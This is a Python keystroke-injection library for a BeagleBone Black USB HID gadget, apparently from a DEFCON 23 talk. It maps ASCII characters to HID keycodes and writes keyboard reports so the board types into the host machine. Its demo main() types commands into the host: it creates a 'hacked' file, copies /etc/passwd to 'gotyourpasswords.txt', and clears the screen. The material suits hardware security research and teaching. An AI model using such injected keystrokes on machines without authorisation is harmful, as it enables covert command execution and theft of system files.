#!/usr/bin/python
"""
udeck-hid.py

Defines functions for injecting
keyboard commands on the Udeck-HID keyboard
created on the BeagleBone Black.  The Udeck
(USB Deck module for Deck Linux) was first
presented by Dr. Phil Polstra (@ppolstra)
at DEFCON 23 in 2015.

Creative Commons share & share alike license.
"""

import struct, time

# define the key modifiers
KeyModifier = {
'LeftCtrl'   : 1 << 0,
'LeftShift'  : 1 << 1,
'LeftAlt'    : 1 << 2,
'LeftGui'    : 1 << 3,
'RightCtrl'  : 1 << 4,
'RightShift' : 1 << 5,
'RightAlt'   : 1 << 6,
'RightGui'   : 1 << 7 }

# define ASCII to keycode mapping
# maps ASCII to (modifier, keycode) tuple
AsciiToKey = {
'a' : (0, 4), 'b' : (0, 5), 'c' : (0, 6),
'd' : (0, 7), 'e' : (0, 8), 'f' : (0, 9),
'g' : (0, 10), 'h' : (0, 11), 'i' : (0, 12),
'j' : (0, 13), 'k' : (0, 14), 'l' : (0, 15),
'm' : (0, 16), 'n' : (0, 17), 'o' : (0, 18),
'p' : (0, 19), 'q' : (0, 20), 'r' : (0, 21),
's' : (0, 22), 't' : (0, 23), 'u' : (0, 24),
'v' : (0, 25), 'w' : (0, 26), 'x' : (0, 27),
'y' : (0, 28), 'z' : (0, 29), '1' : (0, 30),
'2' : (0, 31), '3' : (0, 32), '4' : (0, 33),
'5' : (0, 34), '6' : (0, 35), '7' : (0, 36),
'8' : (0, 37), '9' : (0, 38), '0' : (0, 39),
'\n': (0, 40), '\b': (0, 42), '\t': (0, 43),
' ' : (0, 44), '-' : (0, 45), '=' : (0, 46),
'[' : (0, 47), ']' : (0, 48), '\\': (0, 49),
';' : (0, 51), '\'': (0, 52), '`' : (0, 53),
',' : (0, 54), '.' : (0, 55), '/' : (0, 56),
'A' : (2, 4), 'B' : (2, 5), 'C' : (2, 6),
'D' : (2, 7), 'E' : (2, 8), 'F' : (2, 9),
'G' : (2, 10), 'H' : (2, 11), 'I' : (2, 12),
'J' : (2, 13), 'K' : (2, 14), 'L' : (2, 15),
'M' : (2, 16), 'N' : (2, 17), 'O' : (2, 18),
'P' : (2, 19), 'Q' : (2, 20), 'R' : (2, 21),
'S' : (2, 22), 'T' : (2, 23), 'U' : (2, 24),
'V' : (2, 25), 'W' : (2, 26), 'X' : (2, 27),
'Y' : (2, 28), 'Z' : (2, 29), '!' : (2, 30),
'@' : (2, 31), '#' : (2, 32), '$' : (2, 33),
'%' : (2, 34), '^' : (2, 35), '&' : (2, 36),
'*' : (2, 37), '(' : (2, 38), ')' : (2, 39),
'_' : (2, 45), '+' : (2, 46), '{' : (2, 47),
'}' : (2, 48), '|' : (2, 49), ':' : (2, 51),
'"' : (2, 52), '~' : (2, 53), '<' : (2, 54),
'>' : (2, 55), '?' : (2, 56) }



"""
class: UdeckHid
This class is used to send keys and entire 
strings via the Udeck HID device on the BBB.
Key modifiers are supported to allow things
such as <Window-R> to force a command to be
run when attacking Windows systems.
Usage: udh = UdeckHid()
       udh.sendKey(keycode, modifier)
       udh.sendChar(asciiChar)
       udh.sendString(asciiString)
"""
class UdeckHid():
  def __init__(self, hidDev="/dev/hidg0"):
    self.hidDev = hidDev

  def sendKey(self, keycode, modifier):
    # report format is modifier bit vector, reserved, then key code array
    report = struct.pack("BBBBL", modifier, 0x00, keycode, 0x00, 0x00000000) 
    with open(self.hidDev, "wb") as hd:
      # Send key pressed report
      hd.write(report)
      # Send key released report
      report = struct.pack("Q", 0)
      hd.write(report)
 
  def sendCtrlKey(self, asciiChar):
    self.sendKey(AsciiToKey[asciiChar][1], 1)
  
  def sendShiftKey(self, asciiChar):
    self.sendKey(AsciiToKey[asciiChar][1], 2)

  def sendAltKey(self, asciiChar):
    self.sendKey(AsciiToKey[asciiChar][1], 4)

  def sendWindowKey(self, asciiChar):
    self.sendKey(AsciiToKey[asciiChar][1], 8)

  def sendWindowLock(self):
    self.sendWindowKey('l')

  def sendWindowHideDesktop(self):
    self.sendWindowKey('d')

  def sendWindowsCloseActiveWindow(self):
    self.sendKey(0x3d, 4)
 
  def sendWindowsOpenTaskManager(self):
    self.sendKey(0x29, 3)

  def sendWindowsOpenFileExplorer(self):
    self.sendWindowKey('e')

  def sendWindowsSearchForFiles(self):
    self.sendWindowKey('f')

  def sendWindowsLockScreen(self):
    self.sendWindowKey('l')

  def sendWindowsMinimizeAll(self):
    self.sendWindowKey('m')

  def sendWindowsUpsideDownScreen(self):
    self.sendKey(0x51, 5)

  def sendWindowsRightSideUpScreen(self):
    self.sendKey(0x52, 5)

  def sendWindowsSidewaysScreen(self):
    self.sendKey(0x50, 5)

  def sendChar(self, asciiChar):
    (modifier, keycode) = AsciiToKey[asciiChar]
    if keycode !=0:
      self.sendKey(keycode, modifier)

  def sendString(self, asciiString):
    for i in range(0, len(asciiString)):
      self.sendChar(asciiString[i])

  def sendEnter(self):
    self.sendKey(40, 0)

  def sendEsc(self):
    self.sendKey(41, 0)

  def sendFunc(self, num):
    if num < 13:
      self.sendKey(0x39 + num, 0)
    elif num < 25:
      self.sendKey(0x5b + num, 0)

  def sendCapsLock(self):
    self.sendKey(0x39, 0)

  def sendTab(self):
    self.sendKey(0x2b, 0)

  def sendPrintScreen(self):
    self.sendKey(0x46, 0)

  def sendScrollLock(self):
    self.sendKey(0x47, 0)

  def sendPause(self):
    self.sendKey(0x48, 0)

  def sendInsert(self):
    self.sendKey(0x49, 0)
  
  def sendHome(self):
    self.sendKey(0x4a, 0)

  def sendPageUp(self):
    self.sendKey(0x4b, 0)

  def sendDelete(self):
    self.sendKey(0x4c, 0)
  
  def sendEnd(self):
    self.sendKey(0x4d, 0)

  def sendPageDown(self):
    self.sendKey(0x4e, 0)

  def sendRightArrow(self):
    self.sendKey(0x4f, 0)

  def sendLeftArrow(self):
    self.sendKey(0x50, 0)

  def sendDownArrow(self):
    self.sendKey(0x51, 0)

  def sendUpArrow(self):
    self.sendKey(0x52, 0)

  def sendNumLock(self):
    self.sendKey(0x53, 0)

  def sendApplication(self):
    self.sendKey(0x65, 0)

  def sendPower(self):
    self.sendKey(0x66, 0)

  def sendExecute(self):
    self.sendKey(0x74, 0)

  def sendHelp(self):
    self.sendKey(0x75, 0)

  def sendMenu(self):
    self.sendKey(0x76, 0)

  def sendMute(self):
    self.sendKey(0x7f, 0)

  def sendVolumeUp(self):
    self.sendKey(0x80, 0)

  def sendVolumeDown(self):
    self.sendKey(0x81, 0)

  def sendLine(self, asciiString):
    self.sendString(asciiString)
    self.sendEnter()

def main():
  udh = UdeckHid()
  time.sleep(20)
  udh.sendLine("env")
  udh.sendEnter()
  udh.sendLine("nano hacked.txt")
  for i in range(0,10):
    udh.sendString("You are so hacked!\n")
  udh.sendKey(AsciiToKey['x'][1], 1)
  udh.sendKey(AsciiToKey['y'][1], 0)
  udh.sendEnter()
  udh.sendEnter()
  udh.sendLine("cat /etc/passwd > gotyourpasswords.txt")
  udh.sendLine("clear")

if __name__ == "__main__":
  main()


